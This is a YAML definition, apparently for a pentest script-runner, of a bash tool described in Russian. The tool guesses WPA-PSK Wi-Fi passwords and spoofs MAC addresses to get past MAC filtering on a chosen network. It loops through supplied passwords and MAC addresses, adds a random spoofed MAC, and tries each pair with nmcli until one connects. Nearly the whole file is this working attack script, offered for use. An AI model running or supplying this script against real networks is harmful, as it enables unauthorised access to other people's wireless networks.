description: |-
  Перечисляет пароли и MAC-адреса для подключения к WPA PSK точкам доступа.
  Может помочь с обходом MAC-фильтрации.
  Для подключения используется nmcli.

  P.S.: Это явно плохая идея для брута, так что не мучай этот скрипт слишком большими списками
author: vinzekatze
tags:
  - wpa psk
  - connection
  - mac and password enumeration
  - nmcli

arguments:
  i:
    description: интерфейс
    replacer: '#interface#'
    metavar: INTERFACE
  s:
    description: essid или bssid сети для подключения
    replacer: '#ssid#'
    metavar: SSID
  p:
    multiple: true
    description: пароли
    metavar: PASSWORD
    replacer: '#PASS#'
  m:
    default:
      -
    description: MAC-адреса
    multiple: true
    replacer: '#macaddr#'
    metavar: MAC
  v:
    default:
      - N
      - Y
    description: показывать ошибки nmcli
    replacer: '#DEVNULL#'

mode:
  format:
    i: '{!r}'
    s: '{!r}'
    p: '{!r}'
    m: '{!r}'
  replace:
    v:
      N: '&>/dev/null'
      Y: ''


shell: bash
script: >-
  ssid=#ssid#;
  interface=#interface#;
  iw dev $interface info 2>&1 1>/dev/null || { echo "Device $interface not found"; exit ; };
  sudo nmcli dev set $interface managed no; sleep 1;
  sudo ip link set $interface down;
  sudo iw $interface set type managed;
  sudo ip link set $interface up;
  sudo nmcli dev set $interface managed yes; sleep 1;
  conname="$(echo ${ssid}-$(date +%Y%m%d%H%M%S) | sed 's/[^a-zA-Z0-9-]/_/g')";
  randmac=$(macchanger -l | awk '{ print $3 }' | shuf -n 1):$(printf '%02x:%02x:%02x' $[RANDOM%256] $[RANDOM%256] $[RANDOM%256]);
  echo "[target] ssid: $ssid";
  echo "[target] wlan: $interface";
  echo "[target] Scanning networks...";
  sudo nmcli device wifi list ifname "$interface" --rescan yes | cat | grep --color=never $ssid && { echo -e "[target] \e[1;92mFound\e[0m"; } || { echo -e "[target] \e[1;91mNot Found\e[0m"; exit; };
  echo;
  echo "Connection attempts:";
  for macaddr in #macaddr# "$randmac"; do
  for password in #PASS#; do
  echo -n "[$macaddr][$password] ... ";
  sudo nmcli connection add type wifi connection.autoconnect no con-name $conname ssid "$ssid" ifname "$interface" wifi.cloned-mac-address "$macaddr" wifi-sec.key-mgmt wpa-psk wifi-sec.psk "$password" #DEVNULL#;
  sudo nmcli connection up "$conname" #DEVNULL# && { echo -e "\e[1;92mCONNECTED\e[0m"; echo; echo "Connection info:";echo "[nmcli] name:    $conname"; nmcli --fields 'IP4.ADDRESS' connection show $conname | awk -F '[ ]+' '{print "[nmcli] ip:      " $2}'; nmcli --fields 'IP4.GATEWAY' connection show $conname | awk -F '[ ]+' '{print "[nmcli] gateway: " $2}'; break 2; } || { echo -e "\e[1;91mFAIL\e[0m"; sudo nmcli connection delete "$conname" #DEVNULL#; };
  done;
  done